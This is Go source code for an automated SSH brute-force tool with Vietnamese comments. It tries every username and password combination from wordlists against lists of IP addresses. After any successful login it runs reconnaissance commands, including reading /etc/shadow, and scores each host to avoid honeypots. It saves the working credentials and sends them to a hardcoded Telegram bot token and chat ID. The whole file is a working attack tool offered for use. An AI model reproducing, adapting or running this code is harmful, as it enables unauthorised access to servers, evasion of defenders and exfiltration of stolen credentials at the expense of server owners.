package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

// --- CONFIGURATION ---
// Chương trình sẽ tự động sử dụng các thiết lập dưới đây.
// Bạn có thể chỉnh sửa nếu cần.
const (
	// Thông tin Bot Telegram
	TELEGRAM_BOT_TOKEN = "8225839363:AAFPEdO4WzRRSJDjUdtRnuvsYIz8hHOxEt4" // Dán token bot của bạn vào đây
	TELEGRAM_CHAT_ID   = "6073326628"                                  // Dán ID chat của bạn vào đây

	// Tên file cố định
	IP_FILE_NAME       = "open.txt"
	USER_FILE_NAME     = "us.txt"
	PASSWORD_FILE_NAME = "Pas.txt"

	// Thiết lập hiệu năng
	DEFAULT_TIMEOUT_SECONDS = 10 // Timeout cho mỗi lần kết nối SSH (giây)
	CONCURRENT_PER_WORKER   = 75 // Số kết nối đồng thời trên mỗi lõi CPU.
)
// --------------------

const VERSION = "3.3-Automated"

var (
	startTime      time.Time
	totalChecks    int64
	checkedCount   int64
	stats          = struct{ goods, honeypots int64 }{0, 0}
	comboFilePath  string
	maxConnections int
	successfulIPs  = make(map[string]struct{})
	errorStats     = make(map[string]*int64)
	mapMutex       sync.Mutex
)

type SSHTask struct {
	IP, Port, Username, Password string
}

type ServerInfo struct {
	IP, Port, Username, Password, SSHVersion, OSInfo, Hostname string
	IsHoneypot                                                 bool
	HoneypotScore                                              int
	ResponseTime                                               time.Duration
	Commands                                                   map[string]string
	OpenPorts                                                  []string
}

type HoneypotDetector struct {
	TimeAnalysis, CommandAnalysis, NetworkAnalysis bool
}

func sendTelegramNotification(message string) {
	if TELEGRAM_BOT_TOKEN == "" || TELEGRAM_CHAT_ID == "" { return }
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TELEGRAM_BOT_TOKEN)
	data := url.Values{"chat_id": {TELEGRAM_CHAT_ID}, "text": {message}, "parse_mode": {"Markdown"}}
	_, err := http.PostForm(apiURL, data)
	if err != nil { log.Printf("Telegram Error: %v", err) }
}

func main() {
	// Kiểm tra sự tồn tại của các file cần thiết
	requiredFiles := []string{IP_FILE_NAME, USER_FILE_NAME, PASSWORD_FILE_NAME}
	for _, f := range requiredFiles {
		if _, err := os.Stat(f); os.IsNotExist(err) {
			log.Fatalf("FATAL: Required file not found: %s. Please create it and run again.", f)
		}
	}

	maxConnections = runtime.NumCPU()

	fmt.Println("================================================")
	fmt.Printf("🚀 Starting SSH Brute Force Tool v%s 🚀\n", VERSION)
	fmt.Println("================================================")
	fmt.Println("Using automatic configuration:")
	fmt.Printf("- IP File: %s\n", IP_FILE_NAME)
	fmt.Printf("- User File: %s\n", USER_FILE_NAME)
	fmt.Printf("- Password File: %s\n", PASSWORD_FILE_NAME)
	fmt.Printf("- Timeout: %d seconds\n", DEFAULT_TIMEOUT_SECONDS)
	fmt.Printf("- Workers: %d (Maximum CPU cores)\n", maxConnections)
	fmt.Println("------------------------------------------------")

	comboFilePath = "combo.tmp.txt"
	createComboFile(USER_FILE_NAME, PASSWORD_FILE_NAME, comboFilePath)

	startTime = time.Now()

	userCount := countLines(USER_FILE_NAME)
	passCount := countLines(PASSWORD_FILE_NAME)
	ipCount := countLines(IP_FILE_NAME)
	totalChecks = userCount * passCount * ipCount

	if totalChecks == 0 {
		log.Fatal("Input files are empty or unreadable. Exiting.")
	}
	fmt.Printf("Total checks to perform: %d\n", totalChecks)
	fmt.Println("Scan started. See live progress below and on Telegram.")
	fmt.Println("================================================")

	startupMsg := fmt.Sprintf("✅ *Scan v%s Started*\nFile: `%s`\nTimeout: %ds\nWorkers: %d\nTotal Checks: %d", VERSION, IP_FILE_NAME, DEFAULT_TIMEOUT_SECONDS, maxConnections, totalChecks)
	go sendTelegramNotification(startupMsg)

	setupEnhancedWorkerPool(comboFilePath, IP_FILE_NAME)

	finalReport := generateFinalReport()
	sendTelegramNotification(finalReport)

	fmt.Println("\nOperation completed successfully! Check Telegram for the final report.")
	os.Remove(comboFilePath)
}

func generateFinalReport() string {
	var report strings.Builder
	elapsedTime := time.Since(startTime).Round(time.Second)
	report.WriteString(fmt.Sprintf("🏁 *Scan Finished!*\nTotal Time: %s\n", elapsedTime))
	report.WriteString(fmt.Sprintf("- Successful: %d\n- Honeypots: %d\n", atomic.LoadInt64(&stats.goods), atomic.LoadInt64(&stats.honeypots)))

	report.WriteString("\n*Error Summary:*\n")
	mapMutex.Lock()
	if len(errorStats) > 0 {
		for errType, count := range errorStats {
			report.WriteString(fmt.Sprintf("- `%s`: %d\n", errType, *count))
		}
	} else {
		report.WriteString("- No significant errors recorded.\n")
	}
	mapMutex.Unlock()

	return report.String()
}

func telegramPinger() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		currentChecked := atomic.LoadInt64(&checkedCount)
		if currentChecked >= totalChecks { return }
		elapsed := time.Since(startTime).Seconds()
		var speed, percentage float64
		if elapsed > 0 { speed = float64(currentChecked) / elapsed }
		if totalChecks > 0 { percentage = (float64(currentChecked) / float64(totalChecks)) * 100 }
		pingMsg := fmt.Sprintf("⏳ *[PING]* %.1f%% | Speed: %.1f/s | Hits: %d, Pots: %d",
			percentage, speed, atomic.LoadInt64(&stats.goods), atomic.LoadInt64(&stats.honeypots))
		sendTelegramNotification(pingMsg)
		time.Sleep(10 * time.Second)
	}
}

func countLines(filePath string) int64 {
	f, err := os.Open(filePath)
	if err != nil { return 0 }
	defer f.Close()
	buf := make([]byte, 32*1024)
	var count int64
	for {
		n, err := f.Read(buf)
		for i := 0; i < n; i++ {
			if buf[i] == '\n' { count++ }
		}
		if err == io.EOF { break }
	}
	return count + 1
}

func createComboFile(userFile, passFile, outFile string) {
	users, passes := readLines(userFile), readLines(passFile)
	if len(users) == 0 || len(passes) == 0 { log.Fatal("Username or password file is empty.") }
	file, err := os.Create(outFile)
	if err != nil { log.Fatalf("Failed to create temp combo file: %s", err) }
	defer file.Close()
	writer := bufio.NewWriter(file)
	for _, user := range users {
		for _, pass := range passes {
			fmt.Fprintf(writer, "%s:%s\n", user, pass)
		}
	}
	writer.Flush()
}

func readLines(path string) []string {
	file, err := os.Open(path)
	if err != nil { log.Fatalf("Failed to open file '%s': %s", path, err) }
	defer file.Close()
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() { lines = append(lines, scanner.Text()) }
	return lines
}

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" { cmd = exec.Command("cmd", "/c", "cls") } else { cmd = exec.Command("clear") }
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
	commands := map[string]string{
		"hostname": "hostname", "uname": "uname -a", "whoami": "whoami", "pwd": "pwd", "ls_root": "ls -la /",
		"ps": "ps aux | head -10", "netstat": "netstat -tulpn | head -10", "history": "history | tail -5",
		"ssh_version": "ssh -V", "uptime": "uptime", "mount": "mount | head -5", "env": "env | head -10",
	}
	for cmdName, cmd := range commands {
		output := executeCommand(client, cmd)
		serverInfo.Commands[cmdName] = output
		switch cmdName {
		case "hostname": serverInfo.Hostname = strings.TrimSpace(output)
		case "uname": serverInfo.OSInfo = strings.TrimSpace(output)
		case "ssh_version": serverInfo.SSHVersion = strings.TrimSpace(output)
		}
	}
	serverInfo.OpenPorts = scanLocalPorts(client)
}

func executeCommand(client *ssh.Client, command string) string {
	session, err := client.NewSession()
	if err != nil { return fmt.Sprintf("ERROR: %v", err) }
	defer session.Close()
	output, err := session.CombinedOutput(command)
	if err != nil { return fmt.Sprintf("ERROR: %v", err) }
	return string(output)
}

func scanLocalPorts(client *ssh.Client) []string {
	output := executeCommand(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20")
	var ports []string
	re := regexp.MustCompile(`:(\d+)\s`)
	for _, match := range re.FindAllStringSubmatch(output, -1) {
		if len(match) > 1 && !contains(ports, match[1]) {
			ports = append(ports, match[1])
		}
	}
	return ports
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item { return true }
	}
	return false
}

func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *HoneypotDetector) bool {
	score := 0
	score += analyzeCommandOutput(serverInfo)
	if detector.TimeAnalysis { score += analyzeResponseTime(serverInfo) }
	score += analyzeFileSystem(serverInfo)
	score += analyzeProcesses(serverInfo)
	if detector.NetworkAnalysis { score += analyzeNetwork(client) }
	score += behavioralTests(client, serverInfo)
	score += detectAnomalies(serverInfo)
	score += advancedHoneypotTests(client)
	score += performanceTests(client)
	serverInfo.HoneypotScore = score
	return score >= 6
}

func analyzeCommandOutput(serverInfo *ServerInfo) int {
	score := 0
	indicators := []string{"fake", "simulation", "honeypot", "trap", "monitor", "cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap", "/opt/honeypot", "/var/log/honeypot"}
	for _, output := range serverInfo.Commands {
		lowerOutput := strings.ToLower(output)
		for _, indicator := range indicators {
			if strings.Contains(lowerOutput, indicator) { score += 3 }
		}
	}
	return score
}

func analyzeResponseTime(serverInfo *ServerInfo) int { if serverInfo.ResponseTime.Milliseconds() < 10 { return 2 }; return 0 }

func analyzeFileSystem(serverInfo *ServerInfo) int {
	score := 0
	lsOutput, ok := serverInfo.Commands["ls_root"]; if !ok { return 0 }
	patterns := []string{"total 0", "total 4", "honeypot", "fake", "simulation"}
	lowerOutput := strings.ToLower(lsOutput)
	for _, pattern := range patterns { if strings.Contains(lowerOutput, pattern) { score++ } }
	if len(strings.Split(strings.TrimSpace(lsOutput), "\n")) < 5 { score++ }
	return score
}

func analyzeProcesses(serverInfo *ServerInfo) int {
	score := 0
	psOutput, ok := serverInfo.Commands["ps"]; if !ok { return 0 }
	processes := []string{"cowrie", "kippo", "honeypot", "honeyd", "artillery", "honeytrap", "glastopf", "python honeypot"}
	lowerOutput := strings.ToLower(psOutput)
	for _, process := range processes { if strings.Contains(lowerOutput, process) { score += 2 } }
	if len(strings.Split(strings.TrimSpace(psOutput), "\n")) < 5 { score++ }
	return score
}

func analyzeNetwork(client *ssh.Client) int {
	score := 0
	netConfig := executeCommand(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null")
	if strings.Contains(strings.ToLower(netConfig), "total 0") || strings.Contains(strings.ToLower(netConfig), "no such file") { score++ }
	ifaceCheck := executeCommand(client, "ip addr show 2>/dev/null")
	if strings.Contains(strings.ToLower(ifaceCheck), "fake") || strings.Contains(strings.ToLower(ifaceCheck), "trap") { score++ }
	routeCheck := executeCommand(client, "ip route show 2>/dev/null")
	if len(strings.TrimSpace(routeCheck)) < 20 { score++ }
	return score
}

func behavioralTests(client *ssh.Client, serverInfo *ServerInfo) int {
	score := 0
	tmpFile := fmt.Sprintf("/tmp/test_%d", time.Now().UnixNano())
	createOut := executeCommand(client, fmt.Sprintf("echo 'test' > %s", tmpFile))
	if strings.Contains(strings.ToLower(createOut), "permission denied") { score++ } else { executeCommand(client, fmt.Sprintf("rm -f %s", tmpFile)) }
	accessibleCount := 0
	for _, file := range []string{"/etc/passwd", "/etc/shadow", "/proc/version"} {
		output := executeCommand(client, fmt.Sprintf("cat %s 2>/dev/null | head -1", file))
		if !strings.Contains(strings.ToLower(output), "error") && len(output) > 0 { accessibleCount++ }
	}
	if accessibleCount == 3 { score++ }
	return score
}

func advancedHoneypotTests(client *ssh.Client) int {
	score := 0
	cpuInfo := executeCommand(client, "cat /proc/cpuinfo | grep 'model name'")
	if strings.Contains(strings.ToLower(cpuInfo), "qemu") || strings.Contains(strings.ToLower(cpuInfo), "virtual") { score++ }
	pmCheck := executeCommand(client, "which apt || which yum || which pacman || which zypper")
	if len(strings.TrimSpace(pmCheck)) == 0 { score++ }
	services := executeCommand(client, "systemctl list-units --type=service --state=running 2>/dev/null")
	if strings.Contains(services, "0 loaded units") || len(strings.TrimSpace(services)) < 50 { score++ }
	internetTest := executeCommand(client, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'")
	if len(strings.TrimSpace(internetTest)) == 0 { score++ }
	return score
}

func performanceTests(client *ssh.Client) int {
	score := 0
	ioTest := executeCommand(client, "time dd if=/dev/zero of=/tmp/test_io bs=1M count=10 2>&1")
	if strings.Contains(ioTest, "command not found") { score++ }
	executeCommand(client, "rm -f /tmp/test_io")
	netTest := executeCommand(client, "ss -tuln 2>/dev/null | wc -l")
	if count, err := strconv.Atoi(strings.TrimSpace(netTest)); err == nil && count < 5 { score++ }
	return score
}

func detectAnomalies(serverInfo *ServerInfo) int {
	score := 0
	suspiciousHostnames := []string{"honeypot", "fake", "trap", "monitor", "sandbox", "test", "simulation", "GNU/Linux"}
	lowerHostname := strings.ToLower(serverInfo.Hostname)
	for _, suspicious := range suspiciousHostnames { if strings.Contains(lowerHostname, suspicious) { score++ } }
	if uptime, ok := serverInfo.Commands["uptime"]; ok && (strings.Contains(uptime, " min") || strings.Contains(uptime, " 0:")){ score++ }
	if history, ok := serverInfo.Commands["history"]; ok && len(strings.Split(strings.TrimSpace(history), "\n")) < 3 { score++ }
	return score
}

func logSuccessfulConnection(serverInfo *ServerInfo) {
	simpleCreds := fmt.Sprintf("%s:%s@%s:%s\n", serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password)
	appendToFile(simpleCreds, "su-goods.txt")

	firstLineOS := serverInfo.OSInfo
	if strings.Contains(firstLineOS, "\n") { firstLineOS = strings.Split(firstLineOS, "\n")[0] }

	compactInfo := fmt.Sprintf("🎯 *[HIT]* `%s:%s` | `%s:%s` | *Host:* %s | *OS:* %s | *Score:* %d",
		serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password,
		serverInfo.Hostname, firstLineOS, serverInfo.HoneypotScore)
	go sendTelegramNotification(compactInfo)

	detailedInfo := fmt.Sprintf("\n=== 🎯 SSH Success 🎯 ===\n🌐 Target: %s:%s\n🔑 Credentials: %s:%s\n🖥️ Hostname: %s\n🐧 OS: %s\n📡 SSH Version: %s\n⚡ Response Time: %v\n🔌 Open Ports: %v\n🍯 Honeypot Score: %d\n🕒 Timestamp: %s\n========================\n",
		serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.Hostname,
		serverInfo.OSInfo, serverInfo.SSHVersion, serverInfo.ResponseTime, serverInfo.OpenPorts,
		serverInfo.HoneypotScore, time.Now().Format("2006-01-02 15:04:05"))
	appendToFile(detailedInfo, "detailed-results.txt")

	fmt.Printf("✅ SUCCESS: %s", simpleCreds)
}

func banner() {
	for {
		currentChecked := atomic.LoadInt64(&checkedCount)
		goods, honeypots := atomic.LoadInt64(&stats.goods), atomic.LoadInt64(&stats.honeypots)
		if currentChecked >= totalChecks {
			time.Sleep(1 * time.Second)
			clear()
			fmt.Println("================================================")
			fmt.Println("🚀 Scan Finished! Check Telegram for report. 🚀")
			fmt.Println("================================================")
			return
		}
		elapsed := time.Since(startTime).Seconds()
		var speed float64
		if elapsed > 0 { speed = float64(currentChecked) / elapsed }
		clear()
		fmt.Println("================================================")
		fmt.Printf("🚀 SSH Brute Force Tool v%s 🚀\n", VERSION)
		fmt.Println("================================================")
		fmt.Printf("Checked: %d/%d | Speed: %.2f/s\n", currentChecked, totalChecks, speed)
		fmt.Printf("Successful: %d | Honeypots: %d\n", goods, honeypots)
		fmt.Println("================================================")
		time.Sleep(1 * time.Second)
	}
}

func appendToFile(data, filepath string) {
	f, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(data)
}

func setupEnhancedWorkerPool(comboFilePath, ipFilePath string) {
	taskQueue := make(chan SSHTask, CONCURRENT_PER_WORKER*maxConnections)
	var wg sync.WaitGroup
	for i := 0; i < maxConnections; i++ {
		wg.Add(1)
		go enhancedMainWorker(taskQueue, &wg)
	}

	go banner()
	go telegramPinger()

	go func() {
		defer close(taskQueue)
		ipFile, err := os.Open(ipFilePath)
		if err != nil { log.Fatalf("Cannot open IP file for streaming: %v", err) }
		defer ipFile.Close()
		ipScanner := bufio.NewScanner(ipFile)
		for ipScanner.Scan() {
			ipLine := strings.TrimSpace(ipScanner.Text())
			if ipLine == "" { continue }
			ip, port := ipLine, "22"
			if strings.Contains(ipLine, ":") {
				parts := strings.Split(ipLine, ":")
				ip, port = parts[0], parts[1]
			}
			comboFile, err := os.Open(comboFilePath)
			if err != nil { log.Fatalf("Cannot open combo file for streaming: %v", err) }
			comboScanner := bufio.NewScanner(comboFile)
			for comboScanner.Scan() {
				comboLine := strings.TrimSpace(comboScanner.Text())
				if comboLine == "" { continue }
				parts := strings.Split(comboLine, ":")
				if len(parts) >= 2 {
					taskQueue <- SSHTask{ip, port, parts[0], parts[1]}
				}
			}
			comboFile.Close()
		}
	}()
	wg.Wait()
}

func enhancedMainWorker(taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
	defer wg.Done()
	sem := make(chan struct{}, CONCURRENT_PER_WORKER)
	for task := range taskQueue {
		sem <- struct{}{}
		go func(t SSHTask) {
			defer func() { <-sem }()
			processSSHTask(t)
		}(task)
	}
}

func processSSHTask(task SSHTask) {
	defer atomic.AddInt64(&checkedCount, 1)

	config := &ssh.ClientConfig{
		User: task.Username, Auth: []ssh.AuthMethod{ssh.Password(task.Password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), Timeout: time.Duration(DEFAULT_TIMEOUT_SECONDS) * time.Second,
	}

	connStartTime := time.Now()
	client, err := ssh.Dial("tcp", task.IP+":"+task.Port, config)
	if err == nil {
		defer client.Close()
		serverInfo := &ServerInfo{
			IP: task.IP, Port: task.Port, Username: task.Username, Password: task.Password,
			ResponseTime: time.Since(connStartTime), Commands: make(map[string]string),
		}
		detector := &HoneypotDetector{TimeAnalysis: true, CommandAnalysis: true, NetworkAnalysis: true}
		
		gatherSystemInfo(client, serverInfo)
		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)

		successKey := fmt.Sprintf("%s:%s", serverInfo.IP, serverInfo.Port)
		mapMutex.Lock()
		if _, exists := successfulIPs[successKey]; !exists {
			successfulIPs[successKey] = struct{}{}
			if !serverInfo.IsHoneypot {
				atomic.AddInt64(&stats.goods, 1)
				logSuccessfulConnection(serverInfo)
			} else {
				atomic.AddInt64(&stats.honeypots, 1)
				honeypotMsg := fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n",
					serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore)
				appendToFile(honeypotMsg, "honeypots.txt")
			}
		}
		mapMutex.Unlock()
	} else {
		errStr := err.Error()
		var errType string
		if strings.Contains(errStr, "authentication failed") { errType = "Auth Failed"
		} else if strings.Contains(errStr, "connection refused") { errType = "Connection Refused"
		} else if strings.Contains(errStr, "i/o timeout") { errType = "Connection Timeout"
		} else if strings.Contains(errStr, "no such host") { errType = "Invalid Host"
		} else { errType = "Other SSH Error" }

		mapMutex.Lock()
		if _, ok := errorStats[errType]; !ok {
			errorStats[errType] = new(int64)
		}
		atomic.AddInt64(errorStats[errType], 1)
		mapMutex.Unlock()
	}
}